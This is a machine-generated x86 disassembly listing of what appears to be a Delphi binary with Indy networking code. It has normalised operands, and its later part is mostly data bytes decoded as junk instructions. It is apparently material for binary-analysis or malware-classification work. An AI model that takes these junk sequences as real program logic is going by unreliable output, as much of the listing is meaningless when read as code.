sbb edx [ esp + eax * 2 + 0x65 ]
popa
jne r-xdata
je r-xdata
pop esi
pop ebx
retn
inc edx
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ecx
jo r-xdata
mov ecx 0x26
mov edx [ r-xdata ]
call sub_404abc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ede3
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
mov al [ eax + 0xc ]
retn
sub_46ede8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ee49
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee50
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
mov ecx r-xdata
call sub_405a7c
mov eax rw-data
mov edx [ rw-data ]
mov ecx r-xdata
call sub_405a7c
sub edx 0xfffffff8
sub_46eeac
push 0xea004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah dl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46ef29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ef30
retn
sub_46f298
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46f3b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ae48
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f392
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_442be8
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_442be8
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45d658
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f399
mov eax [ ebp - 0x8 ]
call sub_403234
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_442bb8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40405c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_442bb8
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40405c
mov [ ebp - 0x1 ] 0x1
sub_46f3c8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46f576
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ae48
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_46f54c
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_442be8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
xor edx edx
call sub_442ad8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
xor edx edx
call sub_442ad8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x318 ]
xor edx edx
call sub_442ad8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f8 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_442398
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x304 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_44234c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x308 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_44234c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
sub edx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_442398
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_442be8
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45d658
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f553
mov eax [ ebp - 0x8 ]
call sub_403234
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_442bb8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_40405c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_442bb8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40405c
mov [ ebp - 0x1 ] 0x1
sub_46f588
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x2f8 ]
call sub_4425bc
mov esi [ ebx + 0x300 ]
mov edx [ esi + 0x48 ]
add edx [ esi + 0x40 ]
cmp eax edx
jg r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x2f8 ]
call sub_4425bc
mov edx eax
mov eax [ ebx + 0x300 ]
sub edx [ eax + 0x40 ]
sub edx 0x5
mov eax [ ebx + 0x300 ]
call sub_442374
sub_46f5e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f605
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f60c
retn
sub_46f610
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_46f298
mov eax [ rw-data ]
mov [ eax ] sub_46f5d0
mov eax [ rw-data ]
mov [ eax ] sub_46f3c8
sub_46f960
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_46f9da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x2fc ]
call sub_442bb8
cmp [ ebp - 0x4 ] 0x0
setne bl
mov edx ebx
mov eax [ esi + 0x300 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
mov eax [ esi + 0x304 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
test bl bl
jne r-xdata
mov dl 0x1
cmp [ esi + 0x314 ] 0x0
jne r-xdata
xor edx edx
jmp r-xdata
mov eax [ esi + 0x30c ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9e1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_46f9e8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46fa53
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov [ ebx + 0x314 ] 0x1
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa5a
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_46fa60
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46fac4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46facb
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_46faf0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46fb38
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb3f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_46fb44
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46fb74
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb7b
retn
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
sub_46fbcf
add eax 0xfffffff0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x44 ]
sub ax 0xffef
je r-xdata
mov al 0x2
retn
sub ax 0x6
je r-xdata
mov al 0x1
retn
sub ax 0xb
jne r-xdata
mov al 0x3
retn
xor eax eax
retn
sub_46fd1c
sub dl 0x1
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_460720
retn
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xfff5
call sub_460720
retn
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xffef
call sub_460720
jmp r-xdata
retn
sub_46fdde
inc edi
add [ edi + esi * 8 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46fe23
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fe2a
retn
mov eax [ rw-data ]
call sub_405a38
mov eax [ rw-data ]
call sub_405a38
sub_46fe2c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d58
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx eax
test edx edx
je r-xdata
mov eax [ rw-data ]
mov ecx r-xdata
call sub_405a7c
mov eax [ rw-data ]
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx r-xdata
call sub_405a7c
sub edx 0xfffffff8
sub_46fed4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46fef9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ff00
retn
sub_46ff0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ff31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ff38
retn
sub_46ff45
inc [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
inc [ esi ]
or al 0x0
add [ eax ] al
jl r-xdata
xor [ eax ] eax
call 0x2447401a
xor al [ eax ]
adc al [ ebp + 0x49 ]
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
jo r-xdata
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24473fbe
xor al [ eax ]
or al 0x45
dec ecx
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x0
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
imul ebp [ edi + 0x6e ] 0x47004c90
jo r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244740de
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
inc ebx
insb
outsd
jae r-xdata
je r-xdata
inc edi
jb r-xdata
add [ eax ] al
mov al [ 0x7c0046ff ]
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447407a
xor al [ eax ]
pop ss
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
add [ edi ] al
or al 0x0
imul ebp [ edi + 0x6e ] 0xec00408d
inc [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
inc [ esi ]
or al 0x0
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
mov eax eax
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447413a
xor al [ eax ]
adc eax 0x49644945
outsb
jbe r-xdata
jo r-xdata
dec esi
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax ] cl
add [ edi ] eax
add [ eax ] al
arpl [ ebp + 0x66 ] sp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] dh
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
inc edi
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
popad
insd
mov eax eax
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
dec esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x1
insb
jns r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
add [ edi ] eax
or al 0x0
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447419e
xor al [ eax ]
adc [ ebp + 0x49 ] eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx ] al
inc edi
add [ eax + eax ] cl
mov eax eax
rol [ ecx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x47 ] cl
add [ eax + eax ] cl
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
add al [ edi ]
or al 0x0
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244741fe
xor al [ eax ]
adc eax [ ebp + 0x49 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx ] es
inc edi
add [ eax + eax ] cl
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447425e
xor al [ eax ]
or eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244742ba
xor al [ eax ]
adc eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax + 0xc0047 ] cl
outsd
outsb
xor [ edx ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] bl
inc edi
add [ eax + eax ] cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax ] ah
jae r-xdata
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
add eax [ edi ]
or al 0x0
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x2f0c08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
add al [ edi ]
or al 0x0
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447431e
xor al [ eax ]
sbb eax [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
inc eax
add [ edx + esi ] ah
inc eax
add [ ebx ] dl
inc ebp
dec ecx
ror [ edx + eax + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc edi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24474452
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x4
dec ecx
outsb
je r-xdata
nop
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc004705
push 0x6f727245
jb r-xdata
inc eax
add [ edx + esi ] ah
inc eax
add [ edi ] dl
jae r-xdata
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add eax [ edi ]
or al 0x0
popad
imul ebp [ ebp + 0x64 ] 0x4703c090
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax + 0xc0047 ] cl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244744ba
xor al [ eax ]
pop ss
outsd
jb r-xdata
rol [ ebx ] 0x47
push ebx
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6f727245
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244745e6
xor al [ eax ]
sbb eax 0x53644945
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
rcl [ eax + 0x5 ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5 ] dl
inc edi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447457e
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
outsd
outsb
inc ebp
jb r-xdata
jno r-xdata
inc eax
add [ esp + eax ] ah
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244743ee
xor al [ eax ]
adc al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ ebx ] 0x47
add [ eax + eax ] cl
jb r-xdata
jb r-xdata
shl [ esi + eax ] 0x47
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
add eax 0xc0047
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
add al 0x47
add [ eax + eax ] cl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447451e
xor al [ eax ]
adc [ ebp + 0x49 ] eax
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
outsd
jb r-xdata
xor [ eax ] eax
call 0x24474386
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
popad
imul ebp [ ebp + 0x64 ] r-xdata
jb r-xdata
insb
inc ebp
jb r-xdata
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
int3
jb r-xdata
jb r-xdata
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ 0x53644945 ] bl
outsb
inc ecx
jne r-xdata
add al 0x47
inc ebp
jb r-xdata
mov [ edi + eax * 2 ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax ] ah
inc edi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24474652
xor al [ eax ]
and [ ebp + 0x49 ] eax
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
jb r-xdata
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
